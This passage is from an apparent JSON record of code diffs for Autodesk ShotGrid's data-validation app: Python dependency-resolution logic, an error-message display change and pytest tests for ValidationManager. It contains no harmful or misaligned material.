fetch_dependencies is None:\n                # Keep processing dependencies until the set is empty - dependencies may be added during\n                # while iterating if a dependency and another dependency\n                while all_dependencies:\n                    dependency_rule_id = all_dependencies.pop()\n                    if dependency_rule_id in rule_ids:\n                        # Dependency is already found\n                        continue\n\n                    dependency_rule = self.get_rule(dependency_rule_id)\n                    if not dependency_rule:\n                        # Skip dependenceis that the manager does not have\n                        continue\n\n                    # If not yet specified, prompt user to fetch missing dependencies\n                    if fetch_dependencies is None:\n                        if self.notifier:\n                            self.notifier.about_to_open_msg_box.emit()\n\n                        # NOTE for now this is simplified by asking to fetch all or not - if requested this could ask\n                        # to only individual dependencies\n                        if self.has_ui:\n                            from sgtk.platform.qt import QtGui\n\n                            answer = QtGui.QMessageBox.question(\n                                None,\n                                \"Fix Dependencies\",\n                                \"This operation will apply additional fixes for dependencies.\",\n                                QtGui.QMessageBox.Ok | QtGui.QMessageBox.Cancel,\n                            )\n                            fetch_dependencies = bool(answer == QtGui.QMessageBox.Ok)\n                        else:\n                            # TODO allow headless mode to specify whether or not to fetch. Default to fetch\n                            fetch_dependencies = True\n\n                        if self.notifier:\n                            self.notifier.msg_box_closed.emit()\n\n                    if fetch_dependencies:\n                        if not process_rule(dependency_rule):\n                            queue_count += 1\n                    else:\n                        # The user canceled the operation\n                        if emit_signals and self.notifier:\n                            self.notifier.resolve_all_finished.emit()\n                        return\n\n            # Now process the queue of rules, which have dependencies. For each rule, if all dependencies are\n            # resolved or ignored, then resolve it and add it to the resolved list, else add it back to the end\n            # of the queue to try again after all rules in the queue have been processed.\n            #\n            # Detect cycles by calculating the max number of iterations it would take to empty the queue, if this\n            # count is exceeded, then there is a cycle. In the worst case, the each item depends on the item that\n            # comes after it, which means it'll take n + (n-1) + (n-2) + ... + 2 + 1\n            max_iters = queue_count + (queue_count * (queue_count - 1) \/ 2)\n            iter_count = 0\n            while queue:\n                if iter_count > max_iters:\n                    raise RecursionError(\n                        \"Detected cycle in Validation Rule dependencies.\"\n                    )\n                iter_count += 1\n\n                # Get the next rule to process from the queue\n                rule = queue.popleft()\n\n                # Determine if dependencies have been resolved\n                has_dependencies = False\n                rule_dependencies = dependencies.get(rule.id, [])\n                while rule_dependencies and not has_dependencies:\n                    dependency_rule_id = rule_dependencies.pop()\n\n                    if dependency_rule_id not in rule_ids:\n                        if fetch_dependencies:\n                            self._logger.error(\n                                \"Dependency not resolved '{}'\".format(\n                                    dependency_rule_id\n                                )\n                            )\n                        # Dependency is ignored\n                        continue\n\n                    if dependency_rule_id in resolved:\n                        # Dependency has already been resolved\n                        continue\n\n                    # This dependency is not resolved yet, add it back to the set\n                    has_dependencies = True\n                    rule_dependencies.add(dependency_rule_id)\n\n                if has_dependencies:\n                    # Still unresolved dependencies, add it back to the end of the queue\n                    queue.append(rule)\n                else:\n                    self.resolve_rule(rule)\n                    resolved.add(rule.id)\n\n        finally:\n            if emit_signals and self.notifier:\n                self.notifier.resolve_all_finished.emit()\n\n    def resolve_rule(self, rule):\n        \"\"\"\n        Resolve the validation rule.\n\n        :param rule: The validation rule to resolve\n        :type rule: ValidationRule\n        \"\"\"\n\n        self._logger.debug(\n            \"\\nResolving Rule: {}\\nDependencies: {}\".format(\n                rule.id, \", \".join([d for d in rule.get_dependency_names()])\n            )\n        )\n\n        if self.notifier:\n            self.notifier.resolve_rule_begin.emit(rule)\n\n        try:\n            rule.exec_fix()\n        finally:\n            if self.notifier:\n                self.notifier.resolve_rule_finished.emit(rule)\n"},"\/python\/tk_multi_data_validation\/models\/validation_rule_model.py":{"changes":[{"diff":"\n                     )\n \n                 lines = []\n+                error_messages = self._rule.get_error_messages()\n                 if (\n                     self.data(ValidationRuleModel.RULE_HAS_ERROR_ROLE)\n-                    and self._rule.error_message\n+                    and error_messages\n                 ):\n                     lines.append(\n                         \"<span style='color:#EB5555;'>{}<\/span>\".format(\n-                            self._rule.error_message\n+                            \"<br\/>\".join(error_messages)\n                         )\n                     )\n                 if","add":3,"remove":2,"filename":"\/python\/tk_multi_data_validation\/models\/validation_rule_model.py","badparts":["                    and self._rule.error_message","                            self._rule.error_message"],"goodparts":["                error_messages = self._rule.get_error_messages()","                    and error_messages","                            \"<br\/>\".join(error_messages)"]}]},"\/tests\/test_validation_manager.py":{"changes":[{"diff":"\n     manager.validate()\n     expected_calls = [call(r) for r in manager.rules if not r.valid]\n \n-    manager.resolve()\n+    manager.resolve(retry_until_success=False)\n \n     manager.notifier.resolve_all_begin.emit.assert_called_once()\n     manager.notifier.resolve_all_finished.emit.assert_called_once()\n","add":1,"remove":1,"filename":"\/tests\/test_validation_manager.py","badparts":["    manager.resolve()"],"goodparts":["    manager.resolve(retry_until_success=False)"]},{"diff":"\n \n     manager = ValidationManager(bundle, notifier=notifier)\n \n-    manager.resolve(pre_validate=True)\n+    manager.resolve(pre_validate=True, retry_until_success=False)\n \n     manager.notifier.validate_all_begin.emit.assert_called_once()\n     manager.notifier.validate_all_finished.emit.assert_called_once()\n","add":1,"remove":1,"filename":"\/tests\/test_validation_manager.py","badparts":["    manager.resolve(pre_validate=True)"],"goodparts":["    manager.resolve(pre_validate=True, retry_until_success=False)"]}],"source":"\n import copy import os import sys import pytest import mock from mock import call, MagicMock from validation_utils import CheckResult base_dir=os.path.abspath(os.path.join(os.path.dirname(__file__), \"..\", \"python\")) app_dir=os.path.abspath(os.path.join(base_dir, \"tk_multi_data_validation\")) api_dir=os.path.abspath(os.path.join(app_dir, \"api\")) sys.path.extend([base_dir, app_dir, api_dir]) from tk_multi_data_validation.api import ValidationManager class Notifier(object): \"\"\"Mock object for testing.\"\"\" class Logger(object): \"\"\"Mock object for testing.\"\"\" def debug(self, msg): pass def error(self, msg): pass MOCK_GET_VALIDATOR_DATA={ \"rule_1\":{ \"name\": \"Rule \"description\": \"This is the first test rule.\", \"error_msg\": \"This is the error message\", \"dependency_ids\":[\"rule_2\", \"rule_3\", \"omit_rule\"], \"check_func\": lambda: CheckResult(True), }, \"rule_2\":{ \"name\": \"Rule \"description\": \"This is the second test rule.\", \"dependency_ids\":[\"rule_3\"], \"check_func\": lambda: CheckResult(False), }, \"rule_3\":{ \"name\": \"Rule }, \"omit_rule\":{ \"name\": \"This rule will not be excluded by not including it in the config.\", }, } @pytest.fixture def notifier(): \"\"\" A mock Application object to use to create the ValidationManager object. Note that the mock Application does not provide the full functionality of the actual class it represents; any additional functionality required must be added here. \"\"\" class MockValidateAllBeginSignal: emit=MagicMock() class MockValidateAllFinishedSignal: emit=MagicMock() class MockValidateRuleBeginSignal: emit=MagicMock() class MockValidateRuleFinishedSignal: emit=MagicMock() class MockResolveAllBeginSignal: emit=MagicMock() class MockResolveAllFinishedSignal: emit=MagicMock() class MockResolveRuleBeginSignal: emit=MagicMock() class MockResolveRuleFinishedSignal: emit=MagicMock() mock_notifier=MagicMock() mock_notifier.validate_all_begin=MockValidateAllBeginSignal() mock_notifier.validate_all_finished=MockValidateAllFinishedSignal() mock_notifier.validate_rule_begin=MockValidateRuleBeginSignal() mock_notifier.validate_rule_finished=MockValidateRuleFinishedSignal() mock_notifier.resolve_all_begin=MockResolveAllBeginSignal() mock_notifier.resolve_all_finished=MockResolveAllFinishedSignal() mock_notifier.resolve_rule_begin=MockResolveRuleBeginSignal() mock_notifier.resolve_rule_finished=MockResolveRuleFinishedSignal() return mock_notifier @pytest.fixture(scope=\"module\") def bundle_hook_data_validation_return_value(): \"\"\" The return value for the ValidationManager's class variable '_bundle' method call 'execute_hook_method(\"hook_scene_operation\", \"scan_scene\")'. \"\"\" return MOCK_GET_VALIDATOR_DATA @pytest.fixture(scope=\"module\") def bundle_settings(): \"\"\" The settings for the ValidationManager class variable '_bundle'. \"\"\" return{ \"rules\":[ {\"id\": \"rule_1\"}, {\"id\": \"rule_2\", \"required\": False}, {\"id\": \"rule_3\", \"data_type\": \"Test Data\"}, ], } @pytest.fixture(scope=\"module\") def bundle_hook_methods(bundle_hook_data_validation_return_value): \"\"\" A mapping of hooks and their return value for the ValidationManager's class variable '_bundle'. The return values do not necessarily match real production data, this is meant to be used to ensure the ValidationManager can execute its methods without erring on hooks not found. \"\"\" return{ \"hook_data_validation\":{ \"get_validation_data\": bundle_hook_data_validation_return_value }, } @pytest.fixture def bundle(bundle_settings, bundle_hook_methods): \"\"\" A mock Application object to use to create the ValidationManager object. Note that the mock Application does not provide the full functionality of the actual class it represents; any additional functionality required must be added here. \"\"\" def mock_app_get_setting(name, default_value=None): \"\"\" Mock the Application method 'get_settings' \"\"\" return bundle_settings.get(name, default_value) def mock_app_execute_hook_method(hook_name, hook_method, **kwargs): \"\"\" Mock the Application method 'execute_hook_method'. \"\"\" return bundle_hook_methods.get(hook_name,{}).get(hook_method, None) app=MagicMock() app.get_setting=mock_app_get_setting app.execute_hook_method=mock_app_execute_hook_method app.logger=Logger() return app @pytest.fixture def manager(bundle, notifier): \"\"\" Fixture to return a ValidationManager. \"\"\" return ValidationManager(bundle, notifier=notifier) def test_manager_init_does_not_modify_hook_data( bundle, bundle_hook_data_validation_return_value ): \"\"\" Test the ValidationManager init does not modify the hook data used to create the rules. \"\"\" saved_data=copy.deepcopy(bundle_hook_data_validation_return_value) manager=ValidationManager(bundle=bundle) assert saved_data==bundle_hook_data_validation_return_value def test_manager_init_defaults(bundle, bundle_settings): \"\"\" Test the ValidationManager constructor with the default params(except for the bundle that we need to pass in). \"\"\" manager=ValidationManager(bundle) assert manager._bundle is bundle assert manager._logger is bundle.logger assert manager.notifier is None assert not manager.has_ui assert manager.accept_rule_fn is None assert not manager.errors rules=bundle_settings.get(\"rules\",[]) assert len(manager.rules)==len(rules) for rule in rules: found_rule=manager.get_rule(rule[\"id\"]) assert found_rule required=rule.get(\"required\", True) assert found_rule.required==required assert found_rule.data_type==rule.get(\"data_type\") @pytest.mark.parametrize( \"notifier\", [ None, Notifier, ], ) def test_manager_init_with_notifier(bundle, notifier): \"\"\" Test the ValidationManager constructor with the notifier param. \"\"\" manager=ValidationManager(bundle=bundle, notifier=notifier) assert manager.notifier is notifier @pytest.mark.parametrize( \"has_ui\", [ True, False, ], ) def test_manager_init_with_has_ui(bundle, has_ui): \"\"\" Test the ValidationManager constructor with the has_ui param. \"\"\" manager=ValidationManager(bundle=bundle, has_ui=has_ui) assert manager.has_ui==has_ui @pytest.mark.parametrize( \"include_rules\", [ None, [], [\"rule_1\"], [\"rule_1\", \"rule_3\"], [\"rule_1\", \"rule_2\", \"rule_3\"], [\"rule_1\", \"rule_3\", \"omit_rule\"], ], ) def test_manager_init_with_include_rules(bundle, bundle_settings, include_rules): \"\"\" Test the ValidationManager constructor with the has_ui param. \"\"\" manager=ValidationManager(bundle=bundle, include_rules=include_rules) settings_rules=bundle_settings.get(\"rules\",[]) if not include_rules: expected_rules=settings_rules else: expected_rules=[r for r in settings_rules if r[\"id\"] in include_rules] assert len(manager.rules)==len(expected_rules) for rule in expected_rules: assert manager.get_rule(rule[\"id\"]) @pytest.mark.parametrize( \"exclude_rules\", [ None, [], [\"rule_1\"], [\"rule_1\", \"rule_3\"], [\"rule_1\", \"rule_2\", \"rule_3\"], [\"rule_1\", \"rule_3\", \"omit_rule\"], ], ) def test_manager_init_with_exclude_rules(bundle, bundle_settings, exclude_rules): \"\"\" Test the ValidationManager constructor with the exclude_rules param. \"\"\" manager=ValidationManager(bundle=bundle, exclude_rules=exclude_rules) settings_rules=bundle_settings.get(\"rules\",[]) if not exclude_rules: expected_rules=settings_rules else: expected_rules=[r for r in settings_rules if r[\"id\"] not in exclude_rules] assert len(manager.rules)==len(expected_rules) for rule in expected_rules: assert manager.get_rule(rule[\"id\"]) @pytest.mark.parametrize( \"include_rules\", [ None, [], [\"rule_1\"], [\"rule_1\", \"rule_3\"], [\"rule_1\", \"rule_2\", \"rule_3\"], [\"rule_1\", \"rule_3\", \"omit_rule\"], ], ) @pytest.mark.parametrize( \"exclude_rules\", [ None, [], [\"rule_1\"], [\"rule_1\", \"rule_3\"], [\"rule_1\", \"rule_2\", \"rule_3\"], [\"rule_1\", \"rule_3\", \"omit_rule\"], ], ) def test_manager_init_with_include_and_exclude_rules( bundle, bundle_settings, include_rules, exclude_rules ): \"\"\" Test the ValidationManager constructor with the include_rules and exclude_rules param. \"\"\" manager=ValidationManager( bundle=bundle, include_rules=include_rules, exclude_rules=exclude_rules ) settings_rules=bundle_settings.get(\"rules\",[]) expected_rules=[] for rule in settings_rules: if exclude_rules and rule[\"id\"] in exclude_rules: continue if include_rules and rule[\"id\"] not in include_rules: continue expected_rules.append(rule) assert len(manager.rules)==len(expected_rules) for rule in expected_rules: assert manager.get_rule(rule[\"id\"]) @pytest.mark.parametrize( \"rule_settings\", [ None, [], [{\"id\": \"rule_does_not_exist\"}], [{\"id\": \"rule_1\"}], [{\"id\": \"rule_1\"},{\"id\": \"rule_2\"}], [{\"id\": \"rule_1\"},{\"id\": \"rule_2\"},{\"id\": \"rule_3\"}], [{\"id\": \"rule_does_not_exist\"},{\"id\": \"rule_1\"}], ], ) def test_manager_init_with_rule_settings( bundle, bundle_settings, bundle_hook_data_validation_return_value, rule_settings ): \"\"\" Test the ValidationManager constructor with the rule_settings param. \"\"\" manager=ValidationManager(bundle=bundle, rule_settings=rule_settings) if not rule_settings: expected_rules=bundle_settings.get(\"rules\",[]) else: rule_ids=bundle_hook_data_validation_return_value.keys() expected_rules=[r for r in rule_settings if r[\"id\"] in rule_ids] assert len(manager.rules)==len(expected_rules) for rule in expected_rules: assert manager.get_rule(rule[\"id\"]) def test_manager_create_dependencies( manager, bundle_settings, bundle_hook_data_validation_return_value ): \"\"\" Test the ValidationManager constructor creates the Validation Rules correctly. \"\"\" rules=bundle_settings.get(\"rules\",[]) for rule in rules: if rule[\"id\"] not in bundle_hook_data_validation_return_value: continue rule_data=bundle_hook_data_validation_return_value[rule[\"id\"]] dependency_ids=rule_data.get(\"dependency_ids\",[]) found_rule=manager.get_rule(rule[\"id\"]) assert found_rule for dep_id in dependency_ids: found_dep=manager.get_rule(dep_id) if not found_dep: continue assert found_dep.id in found_rule.dependencies assert found_rule.dependencies[found_dep.id]==found_dep.name def test_manager_reset(manager): \"\"\" Test the ValidationManager reset method. \"\"\" manager.reset() assert manager.errors=={} def test_manager_validate(bundle): \"\"\" Test the ValidationManager validate method. \"\"\" manager=ValidationManager(bundle, notifier=None) manager.accept_rule_fn=None success=manager.validate() assert not success assert len(manager.errors)==2 assert \"rule_2\" in manager.errors assert \"rule_3\" in manager.errors def test_manager_validate_with_accept_fn(bundle): \"\"\" Test the ValidationManager validate method. \"\"\" manager=ValidationManager(bundle, notifier=None) manager.accept_rule_fn=lambda r: r.check_func is not None success=manager.validate() assert not success assert len(manager.errors)==1 assert \"rule_2\" in manager.errors def test_manager_validate_successfully(bundle): \"\"\" Test the ValidationManager validate method. \"\"\" manager=ValidationManager(bundle, notifier=None) manager.accept_rule_fn=lambda r: r.id==\"rule_1\" success=manager.validate() assert success assert not manager.errors def test_manager_validate_notifier_signals(bundle, notifier): \"\"\" Test the ValidationManager validate method. \"\"\" manager=ValidationManager(bundle, notifier=notifier) manager.validate() manager.notifier.validate_all_begin.emit.assert_called_once() manager.notifier.validate_all_finished.emit.assert_called_once() expected_calls=[call(r) for r in manager.rules] manager.notifier.validate_rule_begin.emit.assert_has_calls( expected_calls, any_order=True ) manager.notifier.validate_rule_finished.emit.assert_has_calls( expected_calls, any_order=True ) def test_manager_resolve_notifier_signals(bundle, notifier): \"\"\" Test the ValidationManager validate method. \"\"\" manager=ValidationManager(bundle, notifier=notifier) manager.accept_rule_fn=None manager.validate() expected_calls=[call(r) for r in manager.rules if not r.valid] manager.resolve() manager.notifier.resolve_all_begin.emit.assert_called_once() manager.notifier.resolve_all_finished.emit.assert_called_once() manager.notifier.resolve_rule_begin.emit.assert_has_calls( expected_calls, any_order=True ) manager.notifier.resolve_rule_finished.emit.assert_has_calls( expected_calls, any_order=True ) def test_manager_resolve_with_pre_validate_notifier_signals(bundle, notifier): \"\"\" Test the ValidationManager validate method. \"\"\" manager=ValidationManager(bundle, notifier=notifier) manager.resolve(pre_validate=True) manager.notifier.validate_all_begin.emit.assert_called_once() manager.notifier.validate_all_finished.emit.assert_called_once() expected_calls=[call(r) for r in manager.rules] manager.notifier.validate_rule_begin.emit.assert_has_calls( expected_calls, any_order=True ) manager.notifier.validate_rule_finished.emit.assert_has_calls( expected_calls, any_order=True ) ","sourceWithComments":"# Copyright (c) 2022 Autodesk, Inc.\n#\n# CONFIDENTIAL AND PROPRIETARY\n#\n# This work is provided \"AS IS\" and subject to the ShotGrid Pipeline Toolkit\n# Source Code License included in this distribution package. See LICENSE.\n# By accessing, using, copying or modifying this work you indicate your\n# agreement to the ShotGrid Pipeline Toolkit Source Code License. All rights\n# not expressly granted therein are reserved by Autodesk, Inc.\n\nimport copy\nimport os\nimport sys\n\nimport pytest\nimport mock\nfrom mock import call, MagicMock\n\nfrom validation_utils import CheckResult\n\n# Manually add the app modules to the path in order to import them here.\nbase_dir = os.path.abspath(os.path.join(os.path.dirname(__file__), \"..\", \"python\"))\napp_dir = os.path.abspath(os.path.join(base_dir, \"tk_multi_data_validation\"))\napi_dir = os.path.abspath(os.path.join(app_dir, \"api\"))\nsys.path.extend([base_dir, app_dir, api_dir])\nfrom tk_multi_data_validation.api import ValidationManager\n\n\n#########################################################################################################\n# Fixtures and mock data for ValidationManager pytests\n\n\nclass Notifier(object):\n    \"\"\"Mock object for testing.\"\"\"\n\n\nclass Logger(object):\n    \"\"\"Mock object for testing.\"\"\"\n\n    def debug(self, msg):\n        pass\n\n    def error(self, msg):\n        pass\n\n\nMOCK_GET_VALIDATOR_DATA = {\n    \"rule_1\": {\n        \"name\": \"Rule #1\",\n        \"description\": \"This is the first test rule.\",\n        \"error_msg\": \"This is the error message\",\n        \"dependency_ids\": [\"rule_2\", \"rule_3\", \"omit_rule\"],\n        \"check_func\": lambda: CheckResult(True),\n    },\n    \"rule_2\": {\n        \"name\": \"Rule #2\",\n        \"description\": \"This is the second test rule.\",\n        \"dependency_ids\": [\"rule_3\"],\n        \"check_func\": lambda: CheckResult(False),\n    },\n    \"rule_3\": {\n        \"name\": \"Rule #3\",\n    },\n    \"omit_rule\": {\n        \"name\": \"This rule will not be excluded by not including it in the config.\",\n    },\n}\n\n\n@pytest.fixture\ndef notifier():\n    \"\"\"\n    A mock Application object to use to create the ValidationManager object. Note that\n    the mock Application does not provide the full functionality of the actual class\n    it represents; any additional functionality required must be added here.\n    \"\"\"\n\n    class MockValidateAllBeginSignal:\n        emit = MagicMock()\n\n    class MockValidateAllFinishedSignal:\n        emit = MagicMock()\n\n    class MockValidateRuleBeginSignal:\n        emit = MagicMock()\n\n    class MockValidateRuleFinishedSignal:\n        emit = MagicMock()\n\n    class MockResolveAllBeginSignal:\n        emit = MagicMock()\n\n    class MockResolveAllFinishedSignal:\n        emit = MagicMock()\n\n    class MockResolveRuleBeginSignal:\n        emit = MagicMock()\n\n    class MockResolveRuleFinishedSignal:\n        emit = MagicMock()\n\n    # Set up the mock notifier\n    mock_notifier = MagicMock()\n    mock_notifier.validate_all_begin = MockValidateAllBeginSignal()\n    mock_notifier.validate_all_finished = MockValidateAllFinishedSignal()\n    mock_notifier.validate_rule_begin = MockValidateRuleBeginSignal()\n    mock_notifier.validate_rule_finished = MockValidateRuleFinishedSignal()\n    mock_notifier.resolve_all_begin = MockResolveAllBeginSignal()\n    mock_notifier.resolve_all_finished = MockResolveAllFinishedSignal()\n    mock_notifier.resolve_rule_begin = MockResolveRuleBeginSignal()\n    mock_notifier.resolve_rule_finished = MockResolveRuleFinishedSignal()\n\n    return mock_notifier\n\n\n@pytest.fixture(scope=\"module\")\ndef bundle_hook_data_validation_return_value():\n    \"\"\"\n    The return value for the ValidationManager's class variable '_bundle' method\n    call 'execute_hook_method(\"hook_scene_operation\", \"scan_scene\")'.\n    \"\"\"\n\n    return MOCK_GET_VALIDATOR_DATA\n\n\n@pytest.fixture(scope=\"module\")\ndef bundle_settings():\n    \"\"\"\n    The settings for the ValidationManager class variable '_bundle'.\n    \"\"\"\n\n    return {\n        \"rules\": [\n            {\"id\": \"rule_1\"},\n            {\"id\": \"rule_2\", \"required\": False},\n            {\"id\": \"rule_3\", \"data_type\": \"Test Data\"},\n        ],\n    }\n\n\n@pytest.fixture(scope=\"module\")\ndef bundle_hook_methods(bundle_hook_data_validation_return_value):\n    \"\"\"\n    A mapping of hooks and their return value for the ValidationManager's class\n    variable '_bundle'. The return values do not necessarily match real production\n    data, this is meant to be used to ensure the ValidationManager can execute its\n    methods without erring on hooks not found.\n    \"\"\"\n\n    return {\n        \"hook_data_validation\": {\n            \"get_validation_data\": bundle_hook_data_validation_return_value\n        },\n    }\n\n\n@pytest.fixture\ndef bundle(bundle_settings, bundle_hook_methods):\n    \"\"\"\n    A mock Application object to use to create the ValidationManager object. Note that\n    the mock Application does not provide the full functionality of the actual class\n    it represents; any additional functionality required must be added here.\n    \"\"\"\n\n    def mock_app_get_setting(name, default_value=None):\n        \"\"\"\n        Mock the Application method 'get_settings'\n        \"\"\"\n        return bundle_settings.get(name, default_value)\n\n    def mock_app_execute_hook_method(hook_name, hook_method, **kwargs):\n        \"\"\"\n        Mock the Application method 'execute_hook_method'.\n        \"\"\"\n        return bundle_hook_methods.get(hook_name, {}).get(hook_method, None)\n\n    # Set up the mock Application\n    app = MagicMock()\n    app.get_setting = mock_app_get_setting\n    app.execute_hook_method = mock_app_execute_hook_method\n    app.logger = Logger()\n\n    return app\n\n\n@pytest.fixture\ndef manager(bundle, notifier):\n    \"\"\"\n    Fixture to return a ValidationManager.\n    \"\"\"\n\n    return ValidationManager(bundle, notifier=notifier)\n\n\n#########################################################################################################\n# ValidationManager pytests\n#########################################################################################################\n#\n# The purpose of set of tests below are to validate the ValidationManager class functionality.\n# They are light-weight tests that do not use any other Toolkit functionality (e.g. sgtk,\n# Application, Engine, etc.), and strictly focus on testing the ValidationManager class.\n# These tests are not a subclass of TankTestBase (unittest.TestCase) so that we can\n# leverage pytest's functionality, like parametrize and fixtures.\n#\n#########################################################################################################\n\n\ndef test_manager_init_does_not_modify_hook_data(\n    bundle, bundle_hook_data_validation_return_value\n):\n    \"\"\"\n    Test the ValidationManager init does not modify the hook data used to create the rules.\n    \"\"\"\n\n    saved_data = copy.deepcopy(bundle_hook_data_validation_return_value)\n\n    manager = ValidationManager(bundle=bundle)\n\n    assert saved_data == bundle_hook_data_validation_return_value\n\n\ndef test_manager_init_defaults(bundle, bundle_settings):\n    \"\"\"\n    Test the ValidationManager constructor with the default params (except for the bundle\n    that we need to pass in).\n    \"\"\"\n\n    manager = ValidationManager(bundle)\n\n    assert manager._bundle is bundle\n    assert manager._logger is bundle.logger\n    assert manager.notifier is None\n    assert not manager.has_ui\n    assert manager.accept_rule_fn is None\n    assert not manager.errors\n\n    # Check the rules created from the bundle settings\n    rules = bundle_settings.get(\"rules\", [])\n    assert len(manager.rules) == len(rules)\n    for rule in rules:\n        found_rule = manager.get_rule(rule[\"id\"])\n        assert found_rule\n\n        required = rule.get(\"required\", True)\n        assert found_rule.required == required\n\n        assert found_rule.data_type == rule.get(\"data_type\")\n\n\n@pytest.mark.parametrize(\n    \"notifier\",\n    [\n        None,\n        Notifier,\n    ],\n)\ndef test_manager_init_with_notifier(bundle, notifier):\n    \"\"\"\n    Test the ValidationManager constructor with the notifier param.\n    \"\"\"\n\n    manager = ValidationManager(bundle=bundle, notifier=notifier)\n\n    assert manager.notifier is notifier\n\n\n@pytest.mark.parametrize(\n    \"has_ui\",\n    [\n        True,\n        False,\n    ],\n)\ndef test_manager_init_with_has_ui(bundle, has_ui):\n    \"\"\"\n    Test the ValidationManager constructor with the has_ui param.\n    \"\"\"\n\n    manager = ValidationManager(bundle=bundle, has_ui=has_ui)\n\n    assert manager.has_ui == has_ui\n\n\n@pytest.mark.parametrize(\n    \"include_rules\",\n    [\n        None,\n        [],\n        [\"rule_1\"],\n        [\"rule_1\", \"rule_3\"],\n        [\"rule_1\", \"rule_2\", \"rule_3\"],\n        [\"rule_1\", \"rule_3\", \"omit_rule\"],\n    ],\n)\ndef test_manager_init_with_include_rules(bundle, bundle_settings, include_rules):\n    \"\"\"\n    Test the ValidationManager constructor with the has_ui param.\n    \"\"\"\n\n    manager = ValidationManager(bundle=bundle, include_rules=include_rules)\n\n    settings_rules = bundle_settings.get(\"rules\", [])\n\n    if not include_rules:\n        # All rules from the settings should be in the manager\n        expected_rules = settings_rules\n    else:\n        # Only the (valid) rules specified should be in the manager\n        expected_rules = [r for r in settings_rules if r[\"id\"] in include_rules]\n\n    assert len(manager.rules) == len(expected_rules)\n    for rule in expected_rules:\n        assert manager.get_rule(rule[\"id\"])\n\n\n@pytest.mark.parametrize(\n    \"exclude_rules\",\n    [\n        None,\n        [],\n        [\"rule_1\"],\n        [\"rule_1\", \"rule_3\"],\n        [\"rule_1\", \"rule_2\", \"rule_3\"],\n        [\"rule_1\", \"rule_3\", \"omit_rule\"],\n    ],\n)\ndef test_manager_init_with_exclude_rules(bundle, bundle_settings, exclude_rules):\n    \"\"\"\n    Test the ValidationManager constructor with the exclude_rules param.\n    \"\"\"\n\n    manager = ValidationManager(bundle=bundle, exclude_rules=exclude_rules)\n\n    settings_rules = bundle_settings.get(\"rules\", [])\n\n    if not exclude_rules:\n        # All rules from the settings should be in the manager\n        expected_rules = settings_rules\n    else:\n        # Only the (valid) rules specified should be in the manager\n        expected_rules = [r for r in settings_rules if r[\"id\"] not in exclude_rules]\n\n    assert len(manager.rules) == len(expected_rules)\n    for rule in expected_rules:\n        assert manager.get_rule(rule[\"id\"])\n\n\n@pytest.mark.parametrize(\n    \"include_rules\",\n    [\n        None,\n        [],\n        [\"rule_1\"],\n        [\"rule_1\", \"rule_3\"],\n        [\"rule_1\", \"rule_2\", \"rule_3\"],\n        [\"rule_1\", \"rule_3\", \"omit_rule\"],\n    ],\n)\n@pytest.mark.parametrize(\n    \"exclude_rules\",\n    [\n        None,\n        [],\n        [\"rule_1\"],\n        [\"rule_1\", \"rule_3\"],\n        [\"rule_1\", \"rule_2\", \"rule_3\"],\n        [\"rule_1\", \"rule_3\", \"omit_rule\"],\n    ],\n)\ndef test_manager_init_with_include_and_exclude_rules(\n    bundle, bundle_settings, include_rules, exclude_rules\n):\n    \"\"\"\n    Test the ValidationManager constructor with the include_rules and exclude_rules param.\n    \"\"\"\n\n    manager = ValidationManager(\n        bundle=bundle, include_rules=include_rules, exclude_rules=exclude_rules\n    )\n\n    settings_rules = bundle_settings.get(\"rules\", [])\n    expected_rules = []\n    for rule in settings_rules:\n        if exclude_rules and rule[\"id\"] in exclude_rules:\n            # Rule should be excluded\n            # Exclude takes precedence over include\n            continue\n\n        if include_rules and rule[\"id\"] not in include_rules:\n            # Rule is not to be included\n            continue\n\n        # Rule is accepted, add it to the expected list\n        expected_rules.append(rule)\n\n    assert len(manager.rules) == len(expected_rules)\n    for rule in expected_rules:\n        assert manager.get_rule(rule[\"id\"])\n\n\n@pytest.mark.parametrize(\n    \"rule_settings\",\n    [\n        None,\n        [],\n        [{\"id\": \"rule_does_not_exist\"}],\n        [{\"id\": \"rule_1\"}],\n        [{\"id\": \"rule_1\"}, {\"id\": \"rule_2\"}],\n        [{\"id\": \"rule_1\"}, {\"id\": \"rule_2\"}, {\"id\": \"rule_3\"}],\n        [{\"id\": \"rule_does_not_exist\"}, {\"id\": \"rule_1\"}],\n    ],\n)\ndef test_manager_init_with_rule_settings(\n    bundle, bundle_settings, bundle_hook_data_validation_return_value, rule_settings\n):\n    \"\"\"\n    Test the ValidationManager constructor with the rule_settings param.\n    \"\"\"\n\n    # Rule id must exist in the value returned by the hook method, else it won't be added to the manager\n    manager = ValidationManager(bundle=bundle, rule_settings=rule_settings)\n\n    if not rule_settings:\n        expected_rules = bundle_settings.get(\"rules\", [])\n    else:\n        rule_ids = bundle_hook_data_validation_return_value.keys()\n        expected_rules = [r for r in rule_settings if r[\"id\"] in rule_ids]\n\n    assert len(manager.rules) == len(expected_rules)\n    for rule in expected_rules:\n        assert manager.get_rule(rule[\"id\"])\n\n\ndef test_manager_create_dependencies(\n    manager, bundle_settings, bundle_hook_data_validation_return_value\n):\n    \"\"\"\n    Test the ValidationManager constructor creates the Validation Rules correctly.\n    \"\"\"\n\n    rules = bundle_settings.get(\"rules\", [])\n\n    for rule in rules:\n        if rule[\"id\"] not in bundle_hook_data_validation_return_value:\n            continue\n\n        # Get the list of dependency ids from the rule data that will create the ValidationRule object\n        rule_data = bundle_hook_data_validation_return_value[rule[\"id\"]]\n        dependency_ids = rule_data.get(\"dependency_ids\", [])\n\n        # Ensure we can find the ValidationRule object\n        found_rule = manager.get_rule(rule[\"id\"])\n        assert found_rule\n\n        # Go through each expected dependency and assert that it is added to the ValidationRule object\n        for dep_id in dependency_ids:\n            found_dep = manager.get_rule(dep_id)\n            if not found_dep:\n                continue\n\n            assert found_dep.id in found_rule.dependencies\n            assert found_rule.dependencies[found_dep.id] == found_dep.name\n\n\ndef test_manager_reset(manager):\n    \"\"\"\n    Test the ValidationManager reset method.\n    \"\"\"\n\n    manager.reset()\n    assert manager.errors == {}\n\n\ndef test_manager_validate(bundle):\n    \"\"\"\n    Test the ValidationManager validate method.\n    \"\"\"\n\n    manager = ValidationManager(bundle, notifier=None)\n    manager.accept_rule_fn = None\n\n    success = manager.validate()\n    assert not success\n\n    # Based on the hook data, there should be 2 errors.\n    # 1. rule_2 explicitly returns not valid\n    # 2. rule_3 does not have a check function (which makes it manual) and is not manually \"checked\"\n    assert len(manager.errors) == 2\n    assert \"rule_2\" in manager.errors\n    assert \"rule_3\" in manager.errors\n\n\ndef test_manager_validate_with_accept_fn(bundle):\n    \"\"\"\n    Test the ValidationManager validate 